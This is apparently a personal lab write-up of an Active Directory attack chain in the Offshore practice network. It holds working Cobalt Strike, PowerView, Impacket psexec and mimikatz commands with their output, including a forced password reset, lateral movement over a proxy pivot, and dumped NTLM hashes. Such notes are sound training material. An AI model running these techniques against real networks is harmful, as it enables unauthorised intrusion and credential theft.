utilized this command to dump a new Domain Bloodhound
```powershell
beacon> execute-assembly /usr/libbloodhound/resources/app/Collectors/SharpHound.exe -c all --ldapusername bill --ldappassword "I like to map Shares!" --domain DEV.ADMIN.OFFSHORE.COM
```
once bloodhound is opened search `CORP.LOCAL` and `First Degree Trusts` to see that `DEV.ADMIN.OFFSHORE.COM` is the next step.
![[Pasted image 20240104151031.png]]after searching `ADMIN.OFFSHORE.COM` we can see that two devices populate, these are the next steps
the `DC02`
![[Pasted image 20240104151404.png]]
& `WS03` - WS03 is the next step in the attack chain
![[Pasted image 20240104151444.png]]
utilizing the `DC01` beacon and pinging these `FQDN`'s I am able to get actual IP addresses
`WS03` IP Address
```powershell
[01/04 14:42:50] beacon> run ping WS03.DEV.ADMIN.OFFSHORE.COM
[01/04 14:42:50] [*] Tasked beacon to run: ping WS03.DEV.ADMIN.OFFSHORE.COM
[01/04 14:42:51] [+] host called home, sent: 50 bytes
[01/04 14:43:04] [+] received output:


Pinging WS03.DEV.ADMIN.OFFSHORE.COM [172.16.2.102] with 32 bytes of data:


[01/04 14:43:07] [+] received output:
Reply from 172.16.2.102: bytes=32 time<1ms TTL=127
Reply from 172.16.2.102: bytes=32 time=124ms TTL=127
Reply from 172.16.2.102: bytes=32 time=93ms TTL=127

[01/04 14:43:10] [+] received output:
Reply from 172.16.2.102: bytes=32 time<1ms TTL=127

Ping statistics for 172.16.2.102:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 124ms, Average = 54ms

```
`DC01` IP address
```powershell
[01/04 16:00:29] beacon> run ping DC02.DEV.ADMIN.OFFSHORE.COM
[01/04 16:00:29] [*] Tasked beacon to run: ping DC02.DEV.ADMIN.OFFSHORE.COM
[01/04 16:00:30] [+] host called home, sent: 50 bytes
[01/04 16:00:45] [+] received output:


Pinging DC02.DEV.ADMIN.OFFSHORE.COM [172.16.2.6] with 32 bytes of data:
Reply from 172.16.2.6: bytes=32 time<1ms TTL=127

[01/04 16:00:48] [+] received output:
Reply from 172.16.2.6: bytes=32 time=331ms TTL=127
Reply from 172.16.2.6: bytes=32 time=46ms TTL=127
Reply from 172.16.2.6: bytes=32 time=73ms TTL=127

Ping statistics for 172.16.2.6:

    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:

    Minimum = 0ms, Maximum = 331ms, Average = 112ms
```
utilizing `Bloodhound` revealed that `SVC_DEVOPS@CORP.LOCAL` is a local administrator on `WS03.DEV.ADMIN.OFFSHORE.COM` and also a part of `CORP.LOCAL` which we have `DA` for with the `IAMTHEADMINISTRATOR` account 
![[Pasted image 20240109151142.png]]![[Pasted image 20240109151253.png]]
going to look back at `secretsdump.py` DCSYNC to see if I have credentials to `SVC_DEVOPS@CORP.local`
according to previous notes, svc_devops user was found on ms01, going to look at crto notes to find what computer in a domain that a user is on

ran `net logons` and see that svc_devops is in it, going to try to change svc_devops password
```powershell
[01/09 15:23:31] beacon> net logons
[01/09 15:23:31] [*] Tasked beacon to run net logons on localhost
[01/09 15:23:33] [+] host called home, sent: 106292 bytes
[01/09 15:23:43] [+] received output:
Logged on users at \\localhost:


[01/09 15:23:52] [+] received output:
CORP\iamtheadministrator
CORP\DC01$
CORP\DC01$
CORP\DC01$

[01/09 15:24:16] [+] received output:





[01/09 15:24:22] [+] received output:
UserDomain      : 


[01/09 15:24:25] [+] received output:
UserName        : Administrator

ComputerName    : DC01.corp.local


[01/09 15:24:28] [+] received output:
SessionFrom     : 127.0.0.1

SessionFromName : DC01.corp.local


[01/09 15:24:32] [+] received output:
LocalAdmin      : 




[01/09 15:24:40] [+] received output:
UserDomain      : CORP


[01/09 15:24:43] [+] received output:
UserName        : iamtheadministrator

ComputerName    : DC01.corp.local


[01/09 15:24:47] [+] received output:
IPAddress       : 172.16.1.5

SessionFrom     : 

SessionFromName : 


[01/09 15:24:50] [+] received output:
LocalAdmin      : 




[01/09 15:26:06] [+] received output:



[01/09 15:26:12] [+] received output:
SVC_DEVOPS


[01/09 15:26:16] [+] received output:
[01/09 15:26:21] [+] received output:
[01/09 15:28:40] [+] received output:
```

start at this restore point
![[Pasted image 20240109164338.png]]
looking at `bloodhound`, `svc_devops` is a part of the `corp_admins@dev.admin.offshore.com` group which has access to `WS03.DEV.ADMIN.OFFSHORE.com` 
![[Pasted image 20240109182300.png]]
![[Pasted image 20240109182205.png]]
utilize these commands to change the password of `svc_devops` while being the `Domain Admin` account `corp\iamtheadministrator`
```powershell
$cred = ConvertTo-SecureString "bugsy_P4ss" -AsPlainText -force
Set-DomainUserPassword -identity svc_devops -accountpassword $cred
```
![[Pasted image 20240109164514.png]]
run `crackmapexec` to ensure that the password was changed
![[Pasted image 20240109164544.png]]setup proxy pivot on the DC01
![[Pasted image 20240109164629.png]]
ensure to modify `proxychains.conf`

`psexec'd` onto `ws03
this shell is very very slow due to going through proxychains
```powershell
┌──(root💀gobots)-[09Jan2024 18:50:11]-[/usr/share/windows-resources/powersploit/Recon]
└─# proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py CORP.LOCAL/svc_devops@172.16.2.102
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.11.0 - Copyright 2023 Fortra

Password: bugsy_P4ss
[*] Requesting shares on 172.16.2.102.....
[*] Found writable share ADMIN$
[*] Uploading file fOqHJdQp.exe
[*] Opening SVCManager on 172.16.2.102.....
[*] Creating service KWDU on 172.16.2.102.....
[*] Starting service KWDU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> 
```
`cd`'ing to user directory
```powershell
C:\> cd c:\users                                                                                                                                                                                            

c:\Users> dir                                                                                                                                                                                               
 Volume in drive C has no label.                                                                                                                                                                            
 Volume Serial Number is A39E-D5A7                                                                                                                                                                          

 Directory of c:\Users                                                                                                                                                                                      

12/11/2023  02:10 AM    <DIR>          .                                                                                                                                                                    
12/11/2023  02:10 AM    <DIR>          ..                                                                                                                                                                   
07/17/2018  04:42 PM    <DIR>          acltest
07/17/2018  04:42 PM    <DIR>          administrator
06/01/2018  09:48 PM    <DIR>          administrator.DEV
07/17/2018  04:42 PM    <DIR>          ben
06/01/2018  08:24 PM    <DIR>          ben.WS03
07/17/2018  04:42 PM    <DIR>          bob
07/17/2018  04:42 PM    <DIR>          cyberops_svc 
05/13/2018  03:20 PM    <DIR>          cyber_adm
07/17/2018  04:42 PM    <DIR>          iamtheadministrator
02/11/2020  02:34 PM    <DIR>          joe
12/11/2023  02:10 AM    <DIR>          justalocaladmin
07/17/2018  04:42 PM    <DIR>          lazy_admin
05/14/2018  11:44 PM    <DIR>          Public
07/17/2018  04:42 PM    <DIR>          salvador
06/27/2018  03:01 PM    <DIR>          svc_devops
06/27/2018  03:13 PM    <DIR>          svc_techsupport4
07/17/2018  04:42 PM    <DIR>          vincent.delpy
               0 File(s)              0 bytes
              19 Dir(s)  18,295,459,840 bytes free
```


# Headed down another path
```powershell
c:\Users\administrator\Desktop> dir                                                                                                                                                                         
 Volume in drive C has no label.                                                                                                                                                                            
 Volume Serial Number is A39E-D5A7                                                                                                                                                                          

 Directory of c:\Users\administrator\Desktop                                                                                                                                                                

04/29/2018  02:22 AM    <DIR>          .                                                                                                                                                                    
04/29/2018  02:22 AM    <DIR>          ..                                                                                                                                                                   
04/29/2018  02:23 AM                36 flag.txt                                                                                                                                                             
               1 File(s)             36 bytes                                                                                                                                                               
               2 Dir(s)  18,295,459,840 bytes free                                                                                                                                                          
 
c:\Users\administrator\Desktop> type flag.txt                                                                                                                                                               
OFFSHORE{ACL_@bus3_0ft3n_ov3rl00k3d} 
```

once the flag was grabbed I attempted to get a cobaltstrike beacon on `ws03` by impersonating `corp.local\svc_devops` and `psexec'ing`
```powershell
[01/09 20:36:04] beacon> make_token CORP.local\svc_devops bugsy_P4ss
[01/09 20:36:04] [*] Tasked beacon to create a token for CORP.local\svc_devops
[01/09 20:36:08] [+] host called home, sent: 179 bytes
[01/09 20:36:11] [+] Impersonated CORP.local\svc_devops (netonly)
[01/09 20:37:00] beacon> jump psexec64 ws03.DEV.ADMIN.OFFSHORE.COM smb
[01/09 20:37:00] [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-133712212312312312) on ws03.DEV.ADMIN.OFFSHORE.COM via Service Control Manager (\\ws03.DEV.ADMIN.OFFSHORE.COM\ADMIN$\2b795a9.exe)
[01/09 20:37:03] [+] host called home, sent: 360869 bytes
[01/09 20:37:24] [+] received output:
Started service 2b795a9 on ws03.DEV.ADMIN.OFFSHORE.COM
[01/09 20:37:24] [+] established link to child beacon: 172.16.2.102
```
ran `powershell Get-NetComputer DC02 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity` after uploading powerview.ps1
and found dc02 has `  msds-allowedtoactonbehalfofotheridentity    `


pulled a new blood hound.


once on my beacon ran mimikatz:
- joe's password is a blank ntlm
```powershell
[01/10 11:40:06] beacon> mimikatz !sekurlsa::logonpasswords
[01/10 11:40:06] [*] Tasked beacon to run mimikatz's !sekurlsa::logonpasswords command
[01/10 11:40:09] [+] host called home, sent: 815436 bytes
[01/10 11:41:06] [+] received output:

Authentication Id : 0 ; 27439064 (00000000:01a2afd8)
Session           : NewCredentials from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/10/2024 10:52:25 AM
SID               : S-1-5-18
	msv :	
	 [00000003] Primary
	 * Username : joe
	 * Domain   : dev
	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
	tspkg :	
	wdigest :	
	 * Username : joe
	 * Domain   : dev
	 * Password : (null)
	kerberos :	
	 * Username : joe
	 * Domain   : dev
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 27339083 (00000000:01a1294b)
Session           : NewCredentials from 0
User Name         : joe
Domain            : DEV
Logon Server      : (null)
Logon Time        : 1/10/2024 10:38:19 AM
SID               : S-1-5-21-1416445593-394318334-2645530166-1604
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : dev
	 * NTLM     : c61f43b6a4db2676714713836b7d2ea6
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : dev
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : DEV.ADMIN.OFFSHORE.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 22581994 (00000000:015892ea)
Session           : RemoteInteractive from 2
User Name         : joe
Domain            : DEV
Logon Server      : DC02
Logon Time        : 1/10/2024 10:00:37 AM
SID               : S-1-5-21-1416445593-394318334-2645530166-1604
	msv :	
	 [00000003] Primary
	 * Username : joe
	 * Domain   : DEV
	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
	 [00010000] CredentialKeys
	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
	tspkg :	
	wdigest :	
	 * Username : joe
	 * Domain   : DEV
	 * Password : (null)
	kerberos :	
	 * Username : joe
	 * Domain   : DEV.ADMIN.OFFSHORE.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 22581345 (00000000:01589061)
Session           : RemoteInteractive from 2
User Name         : joe
Domain            : DEV
Logon Server      : DC02
Logon Time        : 1/10/2024 10:00:37 AM
SID               : S-1-5-21-1416445593-394318334-2645530166-1604
	msv :	
	 [00000003] Primary
	 * Username : joe
	 * Domain   : DEV
	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
	 [00010000] CredentialKeys
	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
	tspkg :	
	wdigest :	
	 * Username : joe
	 * Domain   : DEV
	 * Password : (null)
	kerberos :	
	 * Username : joe
	 * Domain   : DEV.ADMIN.OFFSHORE.COM
	 * Password : (null)
	ssp :	
	credman :	
```
```powershell
impersonate_token dev\\joe

upload rubeus
load powermad
load powerview
```